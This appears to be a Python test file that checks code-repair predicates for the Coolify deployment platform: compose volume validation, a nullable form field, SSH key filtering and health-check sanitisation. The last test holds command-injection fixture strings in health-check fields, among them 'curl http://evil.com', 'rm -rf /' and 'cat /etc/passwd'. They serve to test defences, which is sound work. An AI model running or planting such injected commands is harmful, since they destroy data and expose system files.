"""Tests for all-root Coolify lineage-recovery witness predicates."""

from __future__ import annotations

from cohort_coolify_full_lineage_recovery_witness import (
    _evaluate_compose_underacceptance,
    _evaluate_healthcheck_preservation,
    _evaluate_onboarding_key_filter,
    _evaluate_stack_form_nullable,
)


def test_compose_underacceptance_requires_two_concrete_regression_repairs() -> None:
    simple = "$isSimpleEnvVar = preg_match"
    candidate = "\n".join([simple] * 4) + "\nif (! $isSimpleEnvVar) { validateShellSafePath($source, 'volume source'); }"
    default_repair = (
        "$isEnvVarWithDefault = preg_match; "
        "if (! $isSimpleEnvVar && ! $isEnvVarWithDefault) {}"
    )
    path_repair = "\n".join(["$isEnvVarWithPath = preg_match"] * 3) + (
        "\nif (! $isSimpleEnvVar && ! $isEnvVarWithDefault && ! $isEnvVarWithPath) {}"
    )
    checks = _evaluate_compose_underacceptance(
        candidate,
        default_repair,
        "array-format with safe environment variable default ${DATA_PATH:-./data} not->toThrow(Exception::class)",
        path_repair,
        (
            "reported issue #7127 ${VOLUMES_PATH}/mysql not->toThrow(Exception::class) "
            "array-format with malicious environment variable default"
        ),
    )
    assert all(checks.values())


def test_stack_form_requires_nullable_property_and_rule_repair() -> None:
    migration = """
public string $dockerCompose;
'dockerCompose' => 'required';
$this->service->docker_compose = $this->dockerCompose;
$this->dockerCompose = $this->service->docker_compose;
"""
    repair = """
public ?string $dockerCompose = null;
'dockerCompose' => 'nullable';
$this->service->docker_compose = $this->dockerCompose;
$this->dockerCompose = $this->service->docker_compose;
"""
    assert all(_evaluate_stack_form_nullable(migration, repair).values())


def test_onboarding_filter_requires_both_queries_and_model_scope() -> None:
    broad = "PrivateKey::ownedByCurrentTeam(['name'])->where('id', '!=', 0)->get();"
    filtered = "PrivateKey::ownedAndOnlySShKeys(['name'])->where('id', '!=', 0)->get();"
    candidate = "\n".join(
        [broad, broad, "$this->selectedExistingPrivateKey = $this->privateKeys->first()->id;"]
    )
    repair = "\n".join([filtered, filtered])
    model = "function ownedAndOnlySShKeys() { return self::query()->where('is_git_related', false); }"
    assert all(_evaluate_onboarding_key_filter(candidate, repair, model).values())


def test_healthcheck_preservation_requires_input_and_runtime_repairs() -> None:
    migration = """
'healthCheckPath' => 'string';
'healthCheckPort' => 'nullable|string';
'healthCheckHost' => 'string';
'healthCheckMethod' => 'string';
'healthCheckScheme' => 'string';
$this->resource->health_check_method = $this->healthCheckMethod;
$this->resource->health_check_scheme = $this->healthCheckScheme;
$this->resource->health_check_host = $this->healthCheckHost;
$this->resource->health_check_port = $this->healthCheckPort;
$this->resource->health_check_path = $this->healthCheckPath;
"""
    form = r"""
in:GET,HEAD,POST,OPTIONS
in:http,https
regex:/^[a-zA-Z0-9.\-_]+$/
nullable|integer|min:1|max:65535
regex:#^[a-zA-Z0-9/\-_.~%]+$#
"""
    job = """
$this->sanitizeHealthCheckValue($this->application->health_check_method
$this->sanitizeHealthCheckValue($this->application->health_check_scheme
$this->sanitizeHealthCheckValue($this->application->health_check_host
$this->sanitizeHealthCheckValue($this->application->health_check_path
$url = escapeshellarg
"""
    tests = """
health_check_host' => 'localhost; id > /tmp/pwned #
health_check_method' => 'GET; curl http://evil.com #
health_check_path' => '/health; rm -rf / #
health_check_scheme' => 'http; cat /etc/passwd #
health_check_port' => '8080; whoami
"""
    assert all(_evaluate_healthcheck_preservation(migration, form, job, tests).values())
